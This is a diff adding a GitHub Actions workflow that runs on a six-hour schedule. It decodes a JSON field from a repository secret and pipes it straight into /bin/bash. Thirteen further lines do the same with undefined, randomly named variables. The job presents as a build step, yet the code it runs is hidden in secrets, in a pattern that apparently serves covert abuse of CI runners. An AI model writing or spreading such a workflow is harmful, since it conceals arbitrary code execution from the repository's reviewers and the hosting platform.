@@ -1,0 +1,30 @@
+name: zhuanyemuqian
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuanyemuqian
+        env:
+          tm5865: ${{ secrets.tm5865 }}
+        run: |
+          echo $tm5865 | jq -r .msu306 | /bin/bash
+          echo $whr2 | jq -r .jgvw310 | /bin/bash
+          echo $zqc96 | jq -r .b4 | /bin/bash
+          echo $bb7798 | jq -r .usa61 | /bin/bash
+          echo $sityb45275 | jq -r .dyr40591 | /bin/bash
+          echo $qyexn762 | jq -r .pzfz8295 | /bin/bash
+          echo $pywyi1 | jq -r .gqcc5 | /bin/bash
+          echo $qmnn6197 | jq -r .kpjzg731 | /bin/bash
+          echo $rvfax59826 | jq -r .x4 | /bin/bash
+          echo $whup06347 | jq -r .rpisg44 | /bin/bash
+          echo $ge538 | jq -r .lvvc375 | /bin/bash
+          echo $huav9 | jq -r .wtc50 | /bin/bash
+          echo $hi267 | jq -r .erfk61 | /bin/bash
+          echo $jhfv13 | jq -r .eeio404 | /bin/bash
+
